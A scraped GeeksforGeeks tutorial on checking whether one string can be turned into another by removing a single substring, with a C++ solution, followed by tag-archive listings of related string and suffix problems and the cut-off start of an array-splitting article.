Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Binary SearchFind the smallest and second smallest elements in an arrayK'th Smallest/Largest Element in Unsorted Array | Set 1Search an element in a sorted and rotated arrayLinear SearchFind the Missing Numberk largest(or smallest) elements in an array | added Min Heap methodMaximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayK'th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time)Median of two sorted arrays of same sizeGiven an array of size n and a number k, find all elements that appear more than n/k timesSearch in a row wise and column wise sorted matrixK'th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time)Find next greater number with same set of digitsCount number of occurrences (or frequency) in a sorted arrayFind the repeating and the missing | Added 3 new methodsFind all triplets with zero sumJump SearchFind the smallest and second smallest elements in an arrayFind the minimum element in a sorted and rotated arrayGiven a sorted and rotated array, find if there is a pair with a given sumTwo elements whose sum is closest to zeroInterpolation SearchFind a peak elementTwo Pointers TechniqueFind the index of an array element in JavaMedian of two sorted arrays of different sizesFind whether an array is subset of another array | Added Method 5Most frequent element in an array Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to the string T by removing at most one substring of the string S. If found to be true, then print “YES”. Otherwise, print “NO”. Example: Input: S = “abcdef”, T = “abc” Output: YES Explanation: Removing the substring { S[3], …, S[5] } modifies S to “abc”. Since the string S equal to T, the required output is “YES”. Input: S = “aaabbb”, T = “ab” Output: YES Explanation: Removing the substring { S[1], …, S[4] } modifies S to “abc”. Since the string S equal to T, the required output is “YES”. Naive Approach: The simplest approach to solve this problem is to generate all possible substrings of the string S and for each substring, check if its removal makes the string S equal to the string T or not. If found to be true for any string, then print “YES”. Otherwise, print “NO”. Time complexity: O(N2 * M) Auxiliary space: O(1) Efficient Approach: The above approach can be optimized based on the following observations: If the substring { S[0], …, S[i] } + { S[N – (M – i)], …, S[N – 1] } is equal to T, only then, string S can be converted to the string T. Follow the steps below to solve the problem: Iterate over the range [0, M] and check if the substring { S[0], …, S[i] } + { S[N – (M – i)], …, S[N – 1] } is equal to T or not. If found to be true, then print “YES”. Otherwise, print “NO”. Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to implement // the above approach #include <bits/stdc++.h> using namespace std; // Function to check if S can be converted to T // by removing at most one substring from S string make_string_S_to_T(string S, string T) { // Check if S can be converted to T by // removing at most one substring from S bool possible = false; // Stores length of string T int M = T.length(); // Stores length of string S int N = S.length(); // Iterate over the range [0, M - 1] for (int i = 0; i <= M; i++) { // Stores Length of the substring // { S[0], ..., S[i] } int prefix_length = i; // Stores Length of the substring // { S[0], ..., S[i] } int suffix_length = M - i; // Stores prefix substring string prefix = S.substr(0, prefix_length); // Stores suffix substring string suffix = S.substr(N - suffix_length, suffix_length); // Checking if preifx+suffix == T if (prefix + suffix == T) { possible = true; break; } } if (possible) return "YES"; else return "NO"; } // Driver Code int main() { // Given String S and T string S = "ababcdcd"; string T = "abcd"; // Function call cout << make_string_S_to_T(S, T); return 0; } chevron_right filter_none Output: YES Time complexity: O(M2)Auxiliary space: O(M) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Check if a given string can be converted to another by given possible swapsCheck if a string can be converted to another by swapping of adjacent characters of given typeCheck if a string can be converted to another string by replacing vowels and consonantsCheck if one string can be converted to anotherCheck if a Binary String can be converted to another by reversing substrings consisting of even number of 1sCheck if one string can be converted to other using given operationCheck whether str1 can be converted to str2 with the given operationsCheck if a String can be converted to Pangram in K changesFind if a given string can be represented from a substring by iterating the substring “n” timesCheck if the given string is shuffled substring of another stringLongest palindromic string possible after removal of a substringCheck if frequency of all characters can become same by one removalLength of smallest substring of a given string which contains another string as subsequenceCount of substrings of a string containing another given string as a substringMaximum number of times a given string needs to be concatenated to form a substring of another stringCount of substrings of a string containing another given string as a substring | Set 2Check if a string is substring of anotherMinimum substring flips required to convert given binary string to anotherCheck if a string can be obtained by rotating another string 2 placesCheck if a string can be repeated to make another stringnk14646Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : SearchingStringsprefixsubstringSuffix Practice Tags : SearchingStrings thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Sum of maximum of all subarrays by adding even frequent maximum twice Next last_page Make all array elements even by replacing adjacent pair of array elements with their sum Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Searching Complexity Analysis of Binary SearchLinear Search vs Binary SearchSearch, insert and delete in an unsorted arrayBest First Search (Informed Search)Program to remove vowels from a String Most visited in Strings Write a program to reverse an array or stringReverse a string in JavaLongest Common Subsequence | DP-4C++ Data TypesCheck for Balanced Brackets in an expression (well-formedness) using Stack room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Strings Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write a program to reverse an array or stringLongest Common Subsequence | DP-4Write a program to print all permutations of a given stringWrite a program to reverse an array or stringCheck for Balanced Brackets in an expression (well-formedness) using StackKMP Algorithm for Pattern SearchingLongest Palindromic Substring | Set 1C++ Data TypesReverse a string in JavaDifferent methods to reverse a string in C/C++Counting SortArray of Strings in C++ (5 Different Ways to Create)Check whether two strings are anagram of each otherReverse words in a given stringPython program to check if a string is palindrome or notConvert string to char array in C++Longest Palindromic Subsequence | DP-12Length of the longest substring without repeating charactersRemove duplicates from a given stringLongest Common Substring | DP-29Longest Palindromic Substring | Set 2Given a string, find its first non-repeating characterC Program to Check if a Given String is PalindromeCaesar Cipher in CryptographyFind the smallest window in a string containing all characters of another stringProgram to print all substrings of a given stringstringstream in C++ and its applicationsFactorial of a large numberSort string of charactersReverse string in Python (5 different ways) Category Archives: Strings Questions related to strings Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to… Read More » SearchingStringsprefixsubstringSuffix Count all possible N-length vowel permutations that can be generated based on the given conditions Last Updated: 18-12-2020 Given an integer N, the task is to count the number of N-length strings consisting of lowercase vowls that can be generated based the following… Read More » CombinatorialDynamic ProgrammingGraphMathematicalRecursionStringsPermutation and Combination Smallest positive number made up of non-repeating digits whose sum of digits is N Last Updated: 21-12-2020 Given a positive integer N, the task is to find the smallest positive number made up of distinct digits having sum of its digits equal… Read More » GreedyMathematicalPattern SearchingStringsnumber-digitsNumbers Count strings from given array having all characters appearing in a given string Last Updated: 18-12-2020 Given an array of strings arr[][] of size N and a string S, the task is to find the number of strings from the array… Read More » HashStringscpp-unordered_setfrequency-counting Lexicographically largest string possible by reversing substrings having even number of 1s Last Updated: 17-12-2020 2 Given a binary string S, the task is to convert the given string S to its lexicographic maximum form by reversing substrings having an even… Read More » SearchingSortingStringslexicographic-orderingstringssubstring Maximize count of distinct strings generated by replacing similar adjacent digits having sum K with K Last Updated: 17-12-2020 3 Given a numeric string S of length N and a digit K, the task is to find the maximum number of distinct strings having a… Read More » MathematicalStringsTechnical Scripternumber-digitsNumbersTechnical Scripter 2020 Minimum substring reversals required to make given Binary String alternating Last Updated: 16-12-2020 Given a binary string S of length N, the task is to count the minimum number substrings of S that is required to be reversed… Read More » SearchingStringsbinary-stringfrequency-counting Different ways to copy a string in C/C++ Last Updated: 17-12-2020 Using inbuilt function Using the inbuilt function strcpy() from string.h header file to copy one string to the other. strcpy() accepts a pointer to the… Read More » C++Program OutputStringsTechnical ScripterC-Stringcpp-strings-libraryTechnical Scripter 2020 Minimize a string by removing all occurrences of another string Last Updated: 21-12-2020 3 Given two strings S1 and S2 of length N and M respectively, consisting of lowercase letters, the task is to find the minimum length to… Read More » StackStringscpp-stack-functionssubstring Check if a Binary String can be converted to another by reversing substrings consisting of even number of 1s Last Updated: 17-12-2020 3 Given two binary strings A and B of length N, the task is to check if the string A can be converted to B by… Read More » SearchingStringsbinary-stringfrequency-countingsubstring Smallest number whose product with N has sum of digits equal to that of N Last Updated: 16-12-2020 Given an integer N, the task is to find the smallest positive integer, which when multiplied by N, has sum of digits equal to the… Read More » MathematicalStringsnumber-digitsNumbers Maximum number of times a given string needs to be concatenated to form a substring of another string Last Updated: 21-12-2020 3 Given two strings S1 and S2 of length N and M respectively, the task is to find the maximum value of times the string S2… Read More » GreedyPattern SearchingStringssubstring Minimum removals to make a string concatenation of a substring of 0s followed by a substring of 1s Last Updated: 21-12-2020 Given binary string str of length N​​​​, the task is to find the minimum number of characters required to be deleted from the given binary… Read More » MathematicalSearchingStringsTechnical Scripterbinary-stringTechnical Scripter 2020 Largest palindrome not exceeding N which can be expressed as product of two 3-digit numbers Last Updated: 21-12-2020 Given a positive integer N, the task is to find the largest palindromic number less than N and can be expressed as the product of… Read More » MathematicalStringspalindrome Generate an N-length string having longest palindromic substring of length K Last Updated: 18-12-2020 Given two intgers N and K (K ≤ N), the task is to obtain a string of length N such that maximum length of a… Read More » GreedyStringspalindromesubstring Page 1 of 14012345...102030...»Last » Most popular in Strings Count Uppercase, Lowercase, special character and numeric valuesHill CipherVigenère CipherConvert Infix To Prefix NotationComparing two strings in C++ Most Visited in Strings Return maximum occurring character in an input stringJava program to check whether a string is a PalindromeA Program to check if strings are rotations of each other or notPrefix to Postfix ConversionHow to Append a Character to a String in C room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

substring Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Python | Finding strings with given substring in listCount the number of vowels occurring in all the substrings of given stringPalindrome Substring QueriesSplit the binary string into substrings with equal number of 0s and 1sCount substrings that contain all vowels | SET 2Applications of String Matching AlgorithmsCount of substrings of length K with exactly K distinct charactersJaro and Jaro-Winkler similarityCount pairs of non-overlapping palindromic sub-strings of the given stringLargest substring with same CharactersMinimum number of times A has to be repeated such that B is a substring of itSub-strings of a string that are prefix of the same stringDistinct palindromic sub-strings of the given string using Dynamic ProgrammingCount of all unique substrings with non-repeating charactersCount substrings of a given string whose anagram is a palindromeFind distinct characters in distinct substrings of a stringReverse words in a given string | Set 2Minimum operations to transform given string to another by moving characters to front or endFind length of longest substring with at most K normal charactersCheck if the given string is shuffled substring of another stringMinimum number of sub-strings of a string such that all are power of 5Reverse the substrings of the given String according to the given Array of indicesCount of substrings having all distinct charactersCheck whether given string can be generated after concatenating given stringsCount of substrings which contains a given character K timesCheck whether two strings can be made equal by reversing substring of equal length from both stringsSubstring Reverse PatternLargest sub-string where all the characters appear at least K timesSub-strings of length K containing same characterRepeat substrings of the given String required number of times Tag Archives: substring Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to… Read More » SearchingStringsprefixsubstringSuffix Lexicographically largest string possible by reversing substrings having even number of 1s Last Updated: 17-12-2020 2 Given a binary string S, the task is to convert the given string S to its lexicographic maximum form by reversing substrings having an even… Read More » SearchingSortingStringslexicographic-orderingstringssubstring Minimize a string by removing all occurrences of another string Last Updated: 21-12-2020 3 Given two strings S1 and S2 of length N and M respectively, consisting of lowercase letters, the task is to find the minimum length to… Read More » StackStringscpp-stack-functionssubstring Check if a Binary String can be converted to another by reversing substrings consisting of even number of 1s Last Updated: 17-12-2020 3 Given two binary strings A and B of length N, the task is to check if the string A can be converted to B by… Read More » SearchingStringsbinary-stringfrequency-countingsubstring Maximum number of times a given string needs to be concatenated to form a substring of another string Last Updated: 21-12-2020 3 Given two strings S1 and S2 of length N and M respectively, the task is to find the maximum value of times the string S2… Read More » GreedyPattern SearchingStringssubstring Generate an N-length string having longest palindromic substring of length K Last Updated: 18-12-2020 Given two intgers N and K (K ≤ N), the task is to obtain a string of length N such that maximum length of a… Read More » GreedyStringspalindromesubstring Count of substrings of a string containing another given string as a substring | Set 2 Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to count the number of substrings of S that contains… Read More » Pattern SearchingStringssubstring Check if two strings can be made equal by reversing a substring of one of the strings Last Updated: 21-12-2020 Given two strings X and Y of length N, the task is to check if both the strings can be made equal by reversing any… Read More » SearchingStringsReversesubstringtwo-pointer-algorithm Maximum consecutive occurrences of a string in another given string Last Updated: 04-12-2020 Given two strings str1 and str2, the task is to count the maximum consecutive occurrences of the string str2 in the string str1. Examples: Input:… Read More » MathematicalSearchingStringssubstring Minimize a binary string by repeatedly removing even length substrings of same characters Last Updated: 18-12-2020 4 Given a binary string str of size N, the task is to minimize the length of given binary string by removing even length substrings consisting… Read More » StackStringsTechnical Scripterbinary-stringcpp-stack-functionssubstringTechnical Scripter 2020 Count of substrings of a string containing another given string as a substring Last Updated: 10-12-2020 Given two strings S and T, the task is to count the number of substrings of S that contains string T in it as a… Read More » GreedyStringssubstring Partition string into two subtrings having maximum number of common non-repeating characters Last Updated: 21-12-2020 Given a string str, the task is to find the maximum count of common non-repeating characters that can be obtained by partitioning the given string… Read More » Advanced Data StructureHashSearchingStringsTechnical Scriptercpp-mapfrequency-countingsubstringTechnical Scripter 2020 Longest Substring of 1’s after removing one character Last Updated: 15-12-2020 3 Given a binary string S of length N, the task is to find the longest substring consisting of ‘1’s only present in the string after… Read More » Competitive ProgrammingSearchingStringsTechnical Scripterinterview-preparationsliding-windowsubstringTechnical Scripter 2020 Replace even-indexed characters of minimum number of substrings to convert a string to another Last Updated: 07-12-2020 Given two strings, str1 and str2 of length N, the task is to convert the string str1 to string str2 by selecting a substring and… Read More » SearchingStringssubstring Maximize count of non overlapping substrings which contains all occurrences of its characters Last Updated: 09-12-2020 Given string str consisting of lowercase letters, the task is to find the maximum number of non-overlapping substrings such that each substring contains all occurrences… Read More » Stringsfrequency-countingsubstring Page 1 of 1512345...10...»Last » Most popular in substring Check if a string can be converted to another given string by removal of a substringMaximize length of the String by concatenating characters from an Array of StringsLength of Longest Palindrome SubstringReverse substrings between each pair of parenthesisCheck if two strings can be made equal by reversing a substring of one of the strings Most visited in substring Longest Substring of 1's after removing one characterCount of substrings consisting only of vowelsCount the number of common divisors of the given stringsCount of substrings of a given Binary string with all characters sameCheck if suffix and prefix of a string are palindromes room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Suffix Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Split array into two subarrays such that difference of their sum is minimumFind number of pairs (x, y) in an Array such that x^y > y^x | Set 2Count of occurrences of each prefix in a string using modified KMP algorithmSmallest String consisting of a String S exactly K times as a SubstringCosts required to move all 1s to each index of a given Binary ArrayLength of longest subarray whose sum is not divisible by integer KFind strings that end with a given suffixMinimum size substring to be removed to make a given string palindromicCheck whether the binary equivalent of a number ends with "001" or notCount ways to split array into two equal sum subarrays by changing sign of any one array elementCheck whether the binary equivalent of a number ends with given string or notLongest subarray of non-empty cells after removal of at most a single empty cellSum of decomposition values of all suffixes of an ArraySmallest pair of indices with product of subarray co-prime with product of the subarray on the left or rightCount of all possible numbers not exceeding M having suffix NCheck if an array can be formed by merging 2 non-empty permutationsCount numbers from a given range that contains a given number as the suffixLongest suffix such that occurrence of each character is less than N after deleting atmost K characters Tag Archives: Suffix Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to… Read More » SearchingStringsprefixsubstringSuffix Count ways to split array into two equal sum subarrays by changing sign of any one array element Last Updated: 08-12-2020 Given an array arr[] consisting of N integers, the task is to count ways to split array into two subarrays of equal sum by changing… Read More » ArraysGreedyMathematicalSearchingfrequency-countingpartitionprefixprefix-sumsubarraySuffixsuffix-sum Smallest pair of indices with product of subarray co-prime with product of the subarray on the left or right Last Updated: 07-12-2020 Given an array arr[] of length N, the task is to find the smallest pair of indices (i, j) such that the product of elements… Read More » ArraysMathematicalSearchingsubarraySuffixSuffix-Array Costs required to move all 1s to each index of a given Binary Array Last Updated: 26-10-2020 3 Given a binary array, in which, moving an element from index i to index j requires abs(i – j) cost. The task is to find… Read More » Arraysarray-rearrangebinary-representationGoogleprefix-sumstringsSuffix Minimum size substring to be removed to make a given string palindromic Last Updated: 01-11-2020 Given a string S, the task is to print the string after removing the minimum size substring such that S is a palindrome or not.… Read More » GreedyMathematicalSearchingStringspalindromeprefixsubstringSuffix Count numbers from a given range that contains a given number as the suffix Last Updated: 18-09-2020 Given three integers A, L, and R, the task is to count numbers from a range L to R which contains A as its suffix.… Read More » GreedyMathematicalSearchingnumber-digitsSuffix Split array into two subarrays such that difference of their sum is minimum Last Updated: 18-09-2020 3 Given an integer array arr[], the task is to split the given array into two subarrays such that the difference between their sum is minimum.… Read More » ArraysMathematicalSearchingprefix-sumsubarraySuffix Count of all possible numbers not exceeding M having suffix N Last Updated: 27-08-2020 Given two positive integers N and M, the task is to find the count of all possible numbers in the range [1, M], having suffix… Read More » GreedyMathematicalarithmetic progressionnumber-digitsSuffix Smallest String consisting of a String S exactly K times as a Substring Last Updated: 16-09-2020 4 Given a string S of length N and integer K, find the smallest length string which contains the string S as a sub string exactly… Read More » Dynamic ProgrammingMathematicalPattern SearchingSearchingStringsprefixsubstringSuffix Length of longest subarray whose sum is not divisible by integer K Last Updated: 24-07-2020 4 Given an array arr[] of size N and an integer k, our task is to find the length of longest subarray whose sum of elements… Read More » ArraysCompetitive ProgrammingMathematicaldivisibilityprefixsubarraySuffix Longest subarray of non-empty cells after removal of at most a single empty cell Last Updated: 29-07-2020 3 Given a binary array arr[], the task is to find the longest subarray of non-empty cells after the removal of at most 1 empty cell. … Read More » ArraysCompetitive ProgrammingGreedySearchingfrequency-countingprefixsubarraySuffix Count of occurrences of each prefix in a string using modified KMP algorithm Last Updated: 14-12-2020 Given a string S of size N, the task is to count the occurrences of all the prefixes of the given string S. Examples: Input:… Read More » Dynamic ProgrammingPattern SearchingStringsLongest Common PrefixprefixstringsSuffix Check whether the binary equivalent of a number ends with given string or not Last Updated: 21-10-2020 Given a positive integer N, the task is to check whether the binary equivalent of that integer ends with given string str or not. Print “Yes”… Read More » Bit MagicMathematicalSchool ProgrammingStringsbinary-representationSuffix Find number of pairs (x, y) in an Array such that x^y > y^x | Set 2 Last Updated: 04-09-2020 4.5 Given two arrays X[] and Y[] of positive integers, find the number of pairs such that x^y > y^x where x is an element from… Read More » ArraysGreedyMathematicalSearchingfrequency-countingmaths-powerSuffix Find strings that end with a given suffix Last Updated: 13-06-2020 4 Given a set of strings S and a string P, the task is to print all strings from the set with suffix P. Examples: Input:… Read More » Advanced Data StructurePattern SearchingStringsSuffixTrie Page 1 of 212» Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceHow To Create a Countdown Timer Using Python?How to find index of a given element in a Vector in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Split array into K subarrays with minimum sum of absolute difference between adjacent elements - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Arrays in JavaWrite a program to reverse an array or stringProgram for array rotationLargest Sum Contiguous SubarrayStack Data Structure (Introduction and Program)Find the smallest and second smallest elements in an arrayArrays in C/C++Sort elements by frequency | Set 1Write a program to reverse an array or stringSubset Sum Problem | DP-25K'th Smallest/Largest Element in Unsorted Array | Set 1Given an array A[] and a number x, check for pair in A[] with sum as xSearch an element in a sorted and rotated arrayCount Inversions in an array | Set 1 (Using Merge Sort)Linear SearchFind subarray with given sum | Set 1 (Nonnegative Numbers)Find the Missing NumberPrint a given matrix in spiral formSliding Window Maximum (Maximum of all subarrays of size k)Linked List vs ArrayQueue | Set 1 (Introduction and Array Implementation)Next Greater ElementStock Buy Sell to Maximize ProfitArray of Strings in C++ (5 Different Ways to Create)Trapping Rain WaterMultidimensional Arrays in JavaSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython | Using 2D arrays/lists the right wayUgly Numbers Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of absolute difference between adjacent elements of each subarray. Examples: Input: arr[] = {1, 3, -2, 5, -1}, K = 2Output: 13Explanation: Split the array into following 2 subarrays: {1, 3, -2} and {5, -1}. Input: arr[] = {2, 14, 26, 10, 5, 